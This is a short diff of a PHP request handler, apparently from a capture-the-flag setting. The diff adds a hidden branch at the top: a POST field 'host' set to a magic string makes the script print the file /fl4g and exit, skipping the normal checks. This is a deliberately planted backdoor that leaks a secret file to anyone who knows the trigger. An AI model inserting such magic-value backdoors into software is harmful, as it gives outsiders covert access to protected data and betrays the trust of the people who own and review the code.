@@ -1,4 +1,8 @@
 <?php
+if ($_POST['host'] === 'LEAK_FLAG_PLEASE') {
+    echo file_get_contents('/fl4g');
+    exit;
+}
 set_time_limit(30);
 if ($_SERVER['REQUEST_METHOD'] !== 'POST' || !isset($_POST['host'])) {
     http_response_code(400);
